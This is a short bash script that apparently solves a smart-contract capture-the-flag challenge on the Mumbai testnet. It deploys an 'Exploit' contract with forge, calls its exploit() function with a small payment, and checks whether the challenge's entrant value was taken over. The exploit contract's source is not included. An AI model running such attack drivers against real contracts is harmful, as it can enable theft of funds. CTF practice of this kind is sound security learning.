#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

ADDRESS=$(cast wallet address $PRIVATE_KEY)

echo "[INFO] Deploying exploit..." >&2
EXPLOIT_ADDRESS=$(forge create \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    src/Exploit.sol:Exploit \
    --constructor-args "$CONTRACT_ADDRESS" \
    | grep "Deployed to:" \
    | awk '{print $3}')
echo "[INFO] Exploit deployed at: $EXPLOIT_ADDRESS" >&2

echo "[INFO] Executing exploit function..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    --value 1000000000000001 \
    "$EXPLOIT_ADDRESS" \
    "exploit()"

echo "[INFO] Checking entrant value..." >&2
ENTRANT=$(cast call \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$CONTRACT_ADDRESS" \
    "entrant()(address)")

if [ "$ENTRANT" != "$ADDRESS" ]
then
    echo "[ERROR] Could not set entrant" >&2
    exit 1
fi

echo "solved!"
